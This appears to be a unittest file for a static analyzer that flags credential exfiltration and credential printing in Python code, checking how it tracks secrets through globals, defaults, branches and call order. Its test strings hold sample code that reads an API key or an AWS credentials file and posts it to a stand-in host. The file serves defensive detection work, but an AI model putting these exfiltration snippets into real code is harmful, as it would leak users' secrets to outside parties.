"""Call-time module bindings are distinct from function-definition snapshots."""

import unittest

from test_qindun_certify import MODULE


class PythonGlobalBindingTests(unittest.TestCase):
    def test_global_effects_respect_shadowing_defaults_and_branch_calls(self):
        setup = 'import os,requests\nkey="public"\nsecret=os.getenv("SERVICE_API_KEY")\n'
        setter = "def set_key(value):\n    global key\n    key=value\n"
        sink = 'requests.post("https://other.invalid",data=key)\n'
        cases = [
            ('key=secret\nset_key("public")\n' + sink, False),
            ("def caller(key):\n    set_key(secret)\n    " + sink + 'caller("public")\n', False),
            (
                'def caller():\n    key="public"\n    set_key(secret)\n    ' + sink + "caller()\n",
                False,
            ),
            ('def caller(key=secret):\n    set_key("public")\n    ' + sink + "caller()\n", True),
            ('if unknown:\n    set_key(secret)\nelse:\n    set_key("public")\n' + sink, True),
            ('if unknown:\n    set_key("public")\nelse:\n    set_key(secret)\n' + sink, True),
            ('set_key(secret)\nif unknown:\n    set_key("public")\n' + sink, True),
            ("if set_key(secret):\n    pass\n" + sink, True),
            (
                'def caller():\n    if unknown:\n        set_key(secret)\n    else:\n        set_key("public")\n    '
                + sink
                + "caller()\n",
                True,
            ),
            ("def caller():\n    return\n    set_key(secret)\ncaller()\n" + sink, False),
            (
                'def caller():\n    set_key(secret)\n    return\n    set_key("public")\ncaller()\n'
                + sink,
                True,
            ),
            ("set_key(value=secret)\n" + sink, True),
            ('set_key(**{"value":secret})\n' + sink, True),
        ]
        for source, expected in cases:
            with self.subTest(source=source):
                hits, error = MODULE._python_flow_findings("main.py", setup + setter + source)
                self.assertIsNone(error)
                self.assertEqual(
                    any(
                        h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"
                        and h.disposition == "confirmed"
                        for h in hits
                    ),
                    expected,
                )

    def test_global_effect_coverage_reports_unsupported_control_flow(self):
        setup = 'import os,requests\nkey=os.getenv("SERVICE_API_KEY")\n'
        for body in [
            'if unknown:\n        return\n    key="public"',
            "for item in values:\n        key=item",
            'try:\n        key="public"\n    except Exception:\n        pass',
            'while unknown:\n        key="public"',
            "del key",
        ]:
            with self.subTest(body=body):
                source = setup + "def change():\n    global key\n    " + body + "\nchange()\n"
                _, error = MODULE._python_flow_findings("main.py", source)
                self.assertIsNotNone(error)

    def test_global_auth_and_mixed_payload_are_separate(self):
        source = (
            'import os,requests\nkey="public"\n'
            "def set_key(value):\n    global key\n    key=value\n"
            'set_key(os.getenv("SERVICE_API_KEY"))\n'
            'requests.get("https://service.invalid",headers={"X-API-Key":key})\n'
            'requests.post("https://other.invalid",data=key)\n'
        )
        hits, error = MODULE._python_flow_findings("main.py", source)
        self.assertIsNone(error)
        self.assertEqual(
            {h.disposition for h in hits if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"},
            {"candidate", "confirmed"},
        )

    def test_global_writes_follow_real_call_order(self):
        setup = 'import os,requests\nkey="public"\n'
        setter = "def set_key(value):\n    global key\n    key=value\n"
        sender = 'def send():\n    requests.post("https://other.invalid",data=key)\n'
        secret = 'os.getenv("SERVICE_API_KEY")'
        cases = [
            (setter + sender + f"set_key({secret})\nsend()\n", True),
            (setter + sender + f'set_key({secret})\nset_key("public")\nsend()\n', False),
            (setter + sender + f'set_key("public")\nset_key({secret})\nsend()\n', True),
            (
                setter
                + sender
                + f'set_key({secret})\nset_key("public")\nset_key({secret})\nsend()\n',
                True,
            ),
            (
                setter
                + sender
                + f"def caller(value):\n    set_key(value)\n    send()\ncaller({secret})\n",
                True,
            ),
            (
                setter
                + sender
                + f'def caller(value):\n    set_key(value)\n    requests.post("https://other.invalid",data=key)\ncaller({secret})\n',
                True,
            ),
            (
                setter + sender + f'key={secret}\ndef unused():\n    set_key("public")\nsend()\n',
                True,
            ),
            (setter + sender + f"def unused():\n    set_key({secret})\nsend()\n", False),
            (
                'def set_key():\n    global key\n    key=os.getenv("SERVICE_API_KEY")\n'
                + sender
                + "set_key()\nsend()\n",
                True,
            ),
        ]
        for source, expected in cases:
            with self.subTest(source=source):
                hits, error = MODULE._python_flow_findings("main.py", setup + source)
                self.assertIsNone(error)
                self.assertEqual(
                    any(
                        h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"
                        and h.disposition == "confirmed"
                        for h in hits
                    ),
                    expected,
                )

    def test_global_branch_effects_keep_both_possible_values(self):
        for secret_branch in ("body", "else"):
            public = 'key="public"'
            secret = 'key=os.getenv("SERVICE_API_KEY")'
            body, otherwise = (secret, public) if secret_branch == "body" else (public, secret)
            source = (
                'import os,requests\nkey="public"\n'
                f"def set_key():\n    global key\n    if unknown:\n        {body}\n    else:\n        {otherwise}\n"
                'set_key()\nrequests.post("https://other.invalid",data=key)\n'
            )
            hits, error = MODULE._python_flow_findings("main.py", source)
            self.assertIsNone(error)
            self.assertTrue(any(h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION" for h in hits))

    def test_expanded_http_auth_retains_separate_payload_and_output(self):
        source = (
            'import os,requests\nkey=os.getenv("SERVICE_API_KEY")\n'
            'response=requests.get(**{"url":"https://service.invalid","headers":{"X-API-Key":key}})\n'
            "print(response.request.headers)\n"
            'requests.post(**{"url":"https://other.invalid","data":key})\n'
        )
        hits, error = MODULE._python_flow_findings("main.py", source)
        self.assertIsNone(error)
        self.assertEqual(
            {h.disposition for h in hits if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"},
            {"candidate", "confirmed"},
        )
        self.assertTrue(any(h.rule_id == "QINDUN.D5.CREDENTIAL_OUTPUT" for h in hits))

    def test_expanded_public_default_return_is_not_a_secret_payload(self):
        source = (
            'import os,requests\nkey=os.getenv("SERVICE_API_KEY")\n'
            "def value(*args,key=key):\n    return key\n"
            'requests.post("https://other.invalid",data=value(**{"key":"public"}))\n'
        )
        hits, error = MODULE._python_flow_findings("main.py", source)
        self.assertIsNone(error)
        self.assertFalse(any(h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION" for h in hits))

    def test_parameter_kinds_and_literal_expansion(self):
        secret = 'key=os.getenv("SERVICE_API_KEY")\n'
        cases = [
            (
                'def send(*args,key=key):\n    requests.post("https://other.invalid",data=key)\n',
                'send("public")',
                True,
            ),
            (
                'def send(*args,key=key):\n    requests.post("https://other.invalid",data=key)\n',
                'send("public",key="public")',
                False,
            ),
            (
                'def send(*args,key=key):\n    requests.post("https://other.invalid",data=key)\n',
                'send(**{"key":"public"})',
                False,
            ),
            (
                'def send(*args,key=key):\n    requests.post("https://other.invalid",data=key)\n',
                'send(**{"key":key})',
                True,
            ),
            (
                'def send(value="public",*,key="public"):\n    requests.post("https://other.invalid",data=key)\n',
                "send(key)",
                False,
            ),
            (
                'def send(value="public",*,key="public"):\n    requests.post("https://other.invalid",data=key)\n',
                'send("public",key=key)',
                True,
            ),
            (
                'def send(key=key):\n    requests.post("https://other.invalid",data=key)\n',
                'send(*["public"])',
                False,
            ),
            (
                'def send(key=key):\n    requests.post("https://other.invalid",data=key)\n',
                "send(*(key,))",
                True,
            ),
            (
                'def send(key="public",/,**extras):\n    requests.post("https://other.invalid",data=key)\n',
                'send(**{"key":key})',
                False,
            ),
            (
                'def send(key="public",/,**extras):\n    requests.post("https://other.invalid",data=key)\n',
                "send(key)",
                True,
            ),
        ]
        for definition, call, expected in cases:
            with self.subTest(call=call, definition=definition):
                source = "import os,requests\n" + secret + definition + call + "\n"
                hits, error = MODULE._python_flow_findings("main.py", source)
                self.assertIsNone(error)
                self.assertEqual(
                    any(
                        h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"
                        and h.disposition == "confirmed"
                        for h in hits
                    ),
                    expected,
                )

    def test_literal_override_and_separate_real_payload(self):
        source = (
            'import os,requests\nkey=os.getenv("SERVICE_API_KEY")\n'
            "def value(*args,key=key):\n    return key\n"
            'requests.post("https://other.invalid",data=value(**{"key":"public"}))\n'
            'requests.post("https://other.invalid",data=key)\n'
        )
        hits, error = MODULE._python_flow_findings("main.py", source)
        self.assertIsNone(error)
        self.assertTrue(any(h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION" for h in hits))

        self.assertEqual(
            [h.line for h in hits if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"], [6]
        )

    def test_distinct_default_calls_in_one_expression_keep_return_origins(self):
        for expression in ('value()+value("public")', 'value("public")+value()'):
            source = (
                'import os,requests\nkey=os.getenv("SERVICE_API_KEY")\n'
                "def value(key=key):\n    return key\n"
                'key="public"\n'
                f'requests.post("https://other.invalid",data={expression})\n'
            )
            hits, error = MODULE._python_flow_findings("main.py", source)
            self.assertIsNone(error)
            self.assertTrue(
                any(
                    h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"
                    and h.disposition == "confirmed"
                    for h in hits
                )
            )

    def test_later_confirmed_same_sink_is_not_hidden_by_auth_candidate(self):
        source = (
            "import os,requests\n"
            'def send():\n    requests.get("https://service.invalid",headers={"X-API-Key":key})\n'
            'key=os.getenv("SERVICE_API_KEY")\nsend()\n'
            'key=open("/home/example/.aws/credentials").read()\nsend()\n'
        )
        hits, error = MODULE._python_flow_findings("main.py", source)
        self.assertIsNone(error)
        self.assertTrue(
            any(
                h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION" and h.disposition == "confirmed"
                for h in hits
            )
        )

    def test_branch_alias_nested_call_and_comprehension(self):
        cases = [
            (
                'def send():\n    requests.post("https://other.invalid",data=key)\nif unknown:\n    key=os.getenv("SERVICE_API_KEY")\n    def caller():\n        send()\n    caller()\n',
                "confirmed",
            ),
            (
                'def send():\n    requests.post("https://other.invalid",data=key)\nkey=os.getenv("SERVICE_API_KEY")\nalias=send\nalias()\n',
                "confirmed",
            ),
            (
                'def send():\n    requests.post("https://other.invalid",data=key)\nkey=os.getenv("SERVICE_API_KEY")\n',
                "candidate",
            ),
            (
                'key=os.getenv("SERVICE_API_KEY")\ndef send():\n    values=[key for key in ["public"]]\n    requests.post("https://other.invalid",data=key)\nsend()\n',
                "confirmed",
            ),
            (
                'def send():\n    requests.post("https://other.invalid",data=key)\ndef caller():\n    send()\nkey=os.getenv("SERVICE_API_KEY")\ncaller()\nkey="public"\ncaller()\n',
                "confirmed",
            ),
        ]
        for source, expected in cases:
            with self.subTest(source=source):
                hits, error = MODULE._python_flow_findings(
                    "main.py", "import os,requests\n" + source
                )
                self.assertIsNone(error)
                observed = {
                    h.disposition for h in hits if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"
                }
                self.assertEqual(observed, {expected})

    def test_global_auth_and_separate_body_risks_coexist(self):
        source = (
            "import os,requests\n"
            'def authorize():\n    requests.get(f"https://service.invalid?key={key}")\n'
            'def send():\n    requests.post("https://other.invalid",data=key)\n'
            'key=os.getenv("SERVICE_API_KEY")\nauthorize()\nsend()\n'
        )
        hits, error = MODULE._python_flow_findings("main.py", source)
        self.assertIsNone(error)
        self.assertEqual(
            {h.disposition for h in hits if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"},
            {"candidate", "confirmed"},
        )

    def test_recursive_bodies_terminate_and_call_budget_is_reported(self):
        source = (
            "import os,requests\n"
            'def send():\n    send()\n    requests.post("https://other.invalid",data=key)\n'
            'key=os.getenv("SERVICE_API_KEY")\nsend()\n'
        )
        hits, error = MODULE._python_flow_findings("main.py", source)
        self.assertIsNone(error)
        self.assertTrue(any(h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION" for h in hits))
        source = "\n".join(f"def f{i}():\n    pass" for i in range(513))
        _hits, error = MODULE._python_flow_findings("main.py", source)
        self.assertIsNotNone(error)

    def test_call_time_module_bindings(self):
        secret = 'key=os.getenv("SERVICE_API_KEY")\n'
        send = 'def send():\n    requests.post("https://other.invalid",data=key)\n'
        cases = [
            (secret + send + "send()\n", "confirmed"),
            (send + secret + "send()\n", "confirmed"),
            (secret + send + 'key="public"\nsend()\n', None),
            (send + 'key="public"\nsend()\n' + secret + "send()\n", "confirmed"),
            (
                'def send():\n    requests.get("https://service.invalid",headers={"X-API-Key":key})\n'
                + secret
                + "send()\n",
                "candidate",
            ),
            (
                'def send():\n    requests.get(f"https://service.invalid?key={key}")\n'
                + secret
                + "send()\n",
                "candidate",
            ),
            (
                "def value():\n    return key\n"
                + secret
                + 'requests.post("https://other.invalid",data=value())\n',
                "confirmed",
            ),
            (
                secret
                + 'def send():\n    key="public"\n    requests.post("https://other.invalid",data=key)\nsend()\n',
                None,
            ),
            (
                "def send():\n    requests.get(url)\n"
                + secret
                + 'url=f"https://other.invalid?dump={key}"\nsend()\n',
                "confirmed",
            ),
        ]
        for source, expected in cases:
            with self.subTest(source=source):
                hits, error = MODULE._python_flow_findings(
                    "main.py", "import os,requests\n" + source
                )
                self.assertIsNone(error)
                observed = {
                    h.disposition for h in hits if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"
                }
                self.assertEqual(observed, {expected} if expected else set())

    def test_call_time_output_and_lexical_scopes(self):
        cases = [
            ('def show():\n    print(key)\nkey=os.getenv("SERVICE_API_KEY")\nshow()\n', True),
            (
                'key="public"\ndef show():\n    print(key)\ndef caller():\n    key=os.getenv("SERVICE_API_KEY")\n    show()\ncaller()\n',
                False,
            ),
            (
                'key=os.getenv("SERVICE_API_KEY")\ndef show(key=key):\n    print(key)\nkey="public"\nshow()\n',
                True,
            ),
            (
                'key=os.getenv("SERVICE_API_KEY")\ndef show(key=key):\n    print(key)\nshow("public")\n',
                False,
            ),
            (
                'key=os.getenv("SERVICE_API_KEY")\ndef show():\n    print(key)\n    key="local"\nshow()\n',
                False,
            ),
        ]
        for source, expected in cases:
            with self.subTest(source=source):
                hits, error = MODULE._python_flow_findings(
                    "main.py", "import os,requests\n" + source
                )
                self.assertIsNone(error)
                self.assertEqual(
                    any(h.rule_id == "QINDUN.D5.CREDENTIAL_OUTPUT" for h in hits), expected
                )
